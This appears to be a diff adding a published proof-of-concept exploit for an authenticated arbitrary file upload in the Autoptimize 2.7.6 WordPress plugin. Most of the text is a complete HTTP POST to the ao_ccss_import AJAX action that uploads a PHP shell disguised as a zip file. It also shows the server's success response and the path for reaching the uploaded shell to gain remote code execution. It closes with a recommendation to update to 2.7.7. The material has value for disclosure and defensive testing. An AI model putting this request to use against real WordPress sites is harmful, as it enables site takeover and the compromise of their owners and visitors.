@@ -1,0 +1,84 @@
+# Exploit Title: Wordpress Plugin Autoptimize 2.7.6 - Arbitrary File Upload (Authenticated)
+# Date: 2020-08-24
+# Software Link: https://wordpress.org/plugins/autoptimize/
+# Author : SunCSR Team
+# Version: v2.7.6
+# Tested on Ubuntu 18.04 / Kali Linux
+# Reference: https://wpvulndb.com/vulnerabilities/10372
+
+Description :
+-------------------------------------------------------------------
+
+The ao_ccss_import AJAX call does not ensure that the file provided is a
+legitimate Zip file, allowing high privilege users to upload arbitrary
+files, such as PHP, leading to RCE.
+
+[POC]
+
+Step 1 :
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: pwnme
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101
+Firefox/80.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://pwnme.me/wordpress/wp-admin/options-general.php?page=ao_critcss
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data;
+boundary=---------------------------26086940735210916964189813544
+Content-Length: 685
+Origin: http://pwnme
+Connection: close
+Cookie: autoptimize_feed=1;
+wordpress_01c9c451f599e513a69d1e6bb6f8e273=admin%7C1598689405%7CiAGVovdBGV28Gk5pKstmbpGqYZA7Zbxq7lUoUBL0y6B%7Cc2f54fb4e357d2c591b7e5f53e6adb9531b0de5cc5fbc3cab3185f63917307cd;
+wordpress_test_cookie=WP+Cookie+check;
+wordpress_logged_in_01c9c451f599e513a69d1e6bb6f8e273=admin%7C1598689405%7CiAGVovdBGV28Gk5pKstmbpGqYZA7Zbxq7lUoUBL0y6B%7C409cbfa6f750ff5902273e879e79d9f746c038c35228c978ea9cc3525eb12602;
+wp-settings-time-1=1598516614
+
+
+-----------------------------404272946439029073744006559647
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/zip
+
+<?php Shell Content Here ! ?>
+-----------------------------404272946439029073744006559647
+Content-Disposition: form-data; name="action"
+
+ao_ccss_import
+-----------------------------404272946439029073744006559647
+Content-Disposition: form-data; name="ao_ccss_import_nonce"
+
+f25ca64f22
+-----------------------------404272946439029073744006559647--
+
+
+[Response]
+
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Thu, 27 Aug 2020 08:21:08 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Access-Control-Allow-Origin: http://pwnme.me
+Access-Control-Allow-Credentials: true
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+Content-Length: 53
+
+{"code":"200","msg":"Settings imported successfully"}
+
+
+Step 2: Access to
+http://victim//wordpress/wp-content/uploads/ao_ccss/shell.php
+
+
+Recommendations: Update to version 2.7.7
+
+
+Thank you very much!
